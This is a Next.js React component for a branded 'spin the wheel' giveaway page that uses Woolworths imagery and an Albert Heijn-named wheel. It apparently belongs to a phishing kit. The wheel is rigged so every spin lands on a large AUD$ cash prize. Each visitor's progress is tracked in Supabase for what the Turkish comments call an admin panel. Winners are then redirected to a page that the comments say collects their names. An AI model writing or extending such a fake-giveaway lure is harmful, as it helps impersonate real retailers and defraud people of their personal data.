"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { AlbertHeijnWheel } from "@/components/AlbertHeijnWheel/AlbertHeijnWheel";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { DEFAULT_WHEEL_VIEWPORT, resolveWheelLayout } from "./wheel-layout";
import { logAuditEvent } from "@/lib/audit-event";

type PrizeKind = "amount" | "message";

type PrizeSegment = {
  kind: PrizeKind;
  text: string;
  selectionIndex: number;
  rotationIndex: number;
  amount: number | null;
  popupLines: string[];
};

type WinHistoryItem = {
  prize: string;
  date: string;
};

type SessionRecord = {
  id: string;
  amount: number | null;
  current_step: string | null;
  form_data?: Record<string, unknown> | null;
};

const ANGLE_OFFSET = 0;
const MIN_FULL_SPINS = 6;
const LOCAL_HISTORY_KEY = "ah-prize-wheel-last-five-wins";
const MAX_HISTORY_ITEMS = 5;
const WHEEL_CURRENCY = "AUD$";

const PRIZES: readonly PrizeSegment[] = [
  { kind: "amount", text: "AUD$2,000", selectionIndex: 0, rotationIndex: 0, amount: 2000, popupLines: ["AUD$ 2,000"] },
  { kind: "amount", text: "AUD$2,500", selectionIndex: 1, rotationIndex: 1, amount: 2500, popupLines: ["AUD$ 2,500"] },
  { kind: "amount", text: "AUD$3,000", selectionIndex: 2, rotationIndex: 2, amount: 3000, popupLines: ["AUD$ 3,000"] },
  { kind: "amount", text: "AUD$3,500", selectionIndex: 3, rotationIndex: 3, amount: 3500, popupLines: ["AUD$ 3,500"] },
  { kind: "amount", text: "AUD$4,000", selectionIndex: 4, rotationIndex: 4, amount: 4000, popupLines: ["AUD$ 4,000"] },
  { kind: "amount", text: "AUD$5,000", selectionIndex: 5, rotationIndex: 5, amount: 5000, popupLines: ["AUD$ 5,000"] },
  { kind: "message", text: "TRY AGAIN", selectionIndex: 6, rotationIndex: 6, amount: null, popupLines: ["TRY", "AGAIN"] },
  { kind: "message", text: "BETTER LUCK NEXT TIME", selectionIndex: 7, rotationIndex: 7, amount: null, popupLines: ["BETTER", "LUCK", "NEXT TIME"] },
] as const;

const WINNABLE_PRIZES = PRIZES.filter((prize) => prize.selectionIndex <= 5);

function normalizeAngle(angle: number) {
  return ((angle % 360) + 360) % 360;
}

function formatAmount(amount: number) {
  return new Intl.NumberFormat("en-AU").format(amount);
}

function getTargetRotation(currentRotation: number, rotationIndex: number) {
  const normalizedCurrent = normalizeAngle(currentRotation);
  const targetNormalized = normalizeAngle(ANGLE_OFFSET - rotationIndex * 45);
  const delta = normalizeAngle(targetNormalized - normalizedCurrent);
  return currentRotation + MIN_FULL_SPINS * 360 + delta;
}

function getPrizeFromSession(session: SessionRecord | null) {
  const storedRotationIndex = session?.form_data?.wheel_rotation_index;
  if (typeof storedRotationIndex === "number") {
    return PRIZES.find((prize) => prize.rotationIndex === storedRotationIndex) ?? null;
  }

  const storedLabel = session?.form_data?.wheel_result_label;
  if (typeof storedLabel === "string") {
    return PRIZES.find((prize) => prize.text === storedLabel) ?? null;
  }

  const storedAmount = session?.form_data?.wheel_result_amount;
  if (typeof storedAmount === "number" && storedAmount > 0) {
    return PRIZES.find((prize) => prize.amount === storedAmount) ?? null;
  }

  if (typeof session?.amount === "number" && session.amount > 0) {
    return PRIZES.find((prize) => prize.amount === session.amount) ?? null;
  }

  return null;
}

function getRandomWinnablePrize() {
  return WINNABLE_PRIZES[Math.floor(Math.random() * WINNABLE_PRIZES.length)];
}

function getRotationIndexFromRotation(rotation: number) {
  const normalizedRotation = normalizeAngle(rotation);
  return Math.round(normalizeAngle(ANGLE_OFFSET - normalizedRotation) / 45) % PRIZES.length;
}

function getPrizeFromRotation(rotation: number) {
  const landedRotationIndex = getRotationIndexFromRotation(rotation);
  return PRIZES.find((prize) => prize.rotationIndex === landedRotationIndex) ?? null;
}

function logWheelEvent(eventName: "wheel_spin" | "wheel_win" | "popup_open" | "popup_close", payload?: Record<string, unknown>) {
  const analyticsObj: Record<string, unknown> = {
    event: eventName,
    ...(payload ?? {}),
  };
  console.log("[wheel-analytics]", analyticsObj);
  try {
    logAuditEvent({
      event_kind: "wheel",
      event_action: eventName,
      status: "ok",
      meta: payload ?? {},
    });
  } catch {
    // ignore
  }
}

function readWinHistory() {
  if (typeof window === "undefined") {
    return [] as WinHistoryItem[];
  }

  try {
    const rawValue = window.localStorage.getItem(LOCAL_HISTORY_KEY);
    if (!rawValue) {
      return [];
    }

    const parsed = JSON.parse(rawValue) as WinHistoryItem[];
    return Array.isArray(parsed) ? parsed.slice(0, MAX_HISTORY_ITEMS) : [];
  } catch {
    return [];
  }
}

function storeWinHistory(prize: string) {
  const nextHistory = [
    {
      prize,
      date: new Date().toISOString(),
    },
    ...readWinHistory(),
  ].slice(0, MAX_HISTORY_ITEMS);

  window.localStorage.setItem(LOCAL_HISTORY_KEY, JSON.stringify(nextHistory));
  return nextHistory;
}

export function WheelClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const pendingPrizeRef = useRef<PrizeSegment | null>(null);
  const rotationRef = useRef(0);

  const [spinning, setSpinning] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [resultPrize, setResultPrize] = useState<PrizeSegment | null>(null);
  const [sessionData, setSessionData] = useState<SessionRecord | null>(null);
  const [viewportSize, setViewportSize] = useState({ width: 0, height: 0 });
  const [isViewportReady, setIsViewportReady] = useState(false);
  const [winHistory, setWinHistory] = useState<WinHistoryItem[]>([]);

  const activeLayout = isViewportReady ? resolveWheelLayout(viewportSize) : null;
  const viewportHeight = viewportSize.height > 0 ? viewportSize.height : DEFAULT_WHEEL_VIEWPORT.height;
  const isSpinDisabled = spinning || resultPrize !== null || !sessionData;

  useEffect(() => {
    rotationRef.current = rotation;
  }, [rotation]);

  useEffect(() => {
    setWinHistory(readWinHistory());
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Invalid session.");
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("id,amount,current_step,form_data")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Session not found.");
        return;
      }

      const nextSession = data as SessionRecord;

      // Eğer admin paneli normal link olarak açmışsa ama kullanıcı çark sayfasındaysa,
      // admin panelinde "ÇARK OYUNU" yazması için is_wheel_game'i true yapalım.
      if (nextSession.current_step === "code_entry") {
        // ⭐ WHEEL AKIŞI: İlk açılışta code_entry is_wheel_game'i true yap VE
        //   current_step'i de WHEEL olarak GÜNCELLE.
        //   Böylece GlobalStatusWatcher /code'a geri atamaz.
        const alreadyWheel = (nextSession.form_data as any)?.is_wheel_game === true;
        const updatedFormData = { ...(nextSession.form_data || {}), is_wheel_game: true };
        await supabase.from("sessions").update({
          is_hidden: false,
          current_step: alreadyWheel ? nextSession.current_step : "wheel",
          form_data: updatedFormData,
        }).eq("id", sessionId);
        nextSession.form_data = updatedFormData;
        if (!alreadyWheel) {
          nextSession.current_step = "wheel";
        }
      }

      setSessionData(nextSession);

      const restoredPrize = getPrizeFromSession(nextSession);
      if (restoredPrize && nextSession.current_step === "win") {
        setResultPrize(restoredPrize);
        // ⭐ FLASH YOK: Eski 2000ms setTimeout KALDIRILDI. HEMEN yönlendir (replace).
        const winTarget = `/win/${effectiveRouteSessionId}`;
        try { window.location.replace(winTarget); } catch {}
        try { router.replace(winTarget); } catch {}
      }
    }

    void loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportSize = () => {
      const nextViewportSize = {
        width: Math.round(window.visualViewport?.width ?? window.innerWidth),
        height: Math.round(window.visualViewport?.height ?? window.innerHeight),
      };

      setViewportSize((currentViewportSize) =>
        currentViewportSize.width === nextViewportSize.width && currentViewportSize.height === nextViewportSize.height
          ? currentViewportSize
          : nextViewportSize,
      );
      setIsViewportReady(true);
    };

    updateViewportSize();
    window.visualViewport?.addEventListener("resize", updateViewportSize);
    window.addEventListener("resize", updateViewportSize);
    window.addEventListener("orientationchange", updateViewportSize);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("resize", updateViewportSize);
      window.removeEventListener("orientationchange", updateViewportSize);
    };
  }, []);

  useEffect(() => {
    const previousHtmlOverflow = document.documentElement.style.overflow;
    const previousHtmlOverscroll = document.documentElement.style.overscrollBehavior;
    const previousBodyOverflow = document.body.style.overflow;
    const previousBodyOverscroll = document.body.style.overscrollBehavior;

    document.documentElement.style.overflow = "hidden";
    document.documentElement.style.overscrollBehavior = "none";
    document.body.style.overflow = "hidden";
    document.body.style.overscrollBehavior = "none";

    return () => {
      document.documentElement.style.overflow = previousHtmlOverflow;
      document.documentElement.style.overscrollBehavior = previousHtmlOverscroll;
      document.body.style.overflow = previousBodyOverflow;
      document.body.style.overscrollBehavior = previousBodyOverscroll;
    };
  }, []);



  const finalizeSpin = async (prize: PrizeSegment) => {
    setSpinning(false);
    setResultPrize(prize);
    // setShowPopup(true); // Popup'ı devre dışı bırakıyoruz

    logWheelEvent("wheel_win", {
      prize: prize.text,
      amount: prize.amount,
      selectionIndex: prize.selectionIndex,
      rotationIndex: prize.rotationIndex,
    });

    if (prize.kind === "amount") {
      setWinHistory(storeWinHistory(`${WHEEL_CURRENCY} ${formatAmount(prize.amount ?? 0)}`));
    }

    if (!supabase || !sessionId) {
      return;
    }

    const nextFormData = {
      ...(sessionData?.form_data ?? {}),
      currency: WHEEL_CURRENCY,
      wheel_result_label: prize.text,
      wheel_result_kind: prize.kind,
      wheel_result_amount: prize.amount,
      wheel_rotation_index: prize.rotationIndex,
    };

    await supabase
      .from("sessions")
      .update({ is_hidden: false, amount: prize.amount ?? 0,
        current_step: "win",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSessionData((previous) =>
      previous
        ? {
            ...previous,
            amount: prize.amount ?? 0,
            current_step: "win",
            form_data: nextFormData,
          }
        : previous,
    );

    // ⭐ Çark DURDUKTAN SONRA:
    //   - 1800ms kazanan segmenti göster (kullanıcı rahatça görsün)
    //   - sonra isim-soyisim /win sayfasına yönlen (FLASH YOK: replace)
    setTimeout(() => {
      const winTarget = `/win/${effectiveRouteSessionId}`;
      try { window.location.replace(winTarget); } catch {}
      try { router.replace(winTarget); } catch {}
    }, 2200);
  };

  const spinWheel = () => {
    if (isSpinDisabled) {
      return;
    }

    const nextPrize = getRandomWinnablePrize();
    const startRotation = rotationRef.current;
    const targetRotation = getTargetRotation(startRotation, nextPrize.rotationIndex);

    pendingPrizeRef.current = nextPrize;
    setSpinning(true);
    logWheelEvent("wheel_spin", {
      selectionIndex: nextPrize.selectionIndex,
      targetPrize: nextPrize.text,
    });
    setRotation(targetRotation);
  };

  const handleWheelTransitionEnd = () => {
    if (!spinning || !pendingPrizeRef.current) {
      return;
    }

    const settledPrize = getPrizeFromRotation(rotationRef.current) ?? pendingPrizeRef.current;
    pendingPrizeRef.current = null;
    void finalizeSpin(settledPrize);
  };



  if (error) {
    return (
      <div
        className="flex flex-col items-center justify-center p-6 text-center"
        style={{ minHeight: "100dvh" }}
      >
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Error</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div
        className="relative w-full overflow-hidden bg-[#07160F]"
        style={{
          width: "100vw",
          maxWidth: "100vw",
          height: "100dvh",
          minHeight: "100dvh",
          overflow: "hidden",
          overflowX: "hidden",
          overflowY: "hidden",
          contain: "layout paint size",
          paddingTop: "env(safe-area-inset-top)",
          paddingRight: "env(safe-area-inset-right)",
          paddingBottom: "env(safe-area-inset-bottom)",
          paddingLeft: "env(safe-area-inset-left)",
        }}
      >
        <picture aria-hidden="true" className="absolute inset-0 block">
          <source media="(max-width: 767px)" srcSet="/woolworths/portal/mobile-background-clean.png" />
          <img
            src="/woolworths/portal/desktop-background-clean.png"
            alt=""
            className="h-full w-full object-cover"
            draggable={false}
            loading="eager"
            decoding="async"
            fetchPriority="high"
          />
        </picture>

        {activeLayout ? (
          <AlbertHeijnWheel
            layout={activeLayout}
            rotation={rotation}
            spinning={spinning}
            disabled={isSpinDisabled}
            onSpin={spinWheel}
            onSpinEnd={handleWheelTransitionEnd}
          />
        ) : null}
      </div>


    </>
  );
}
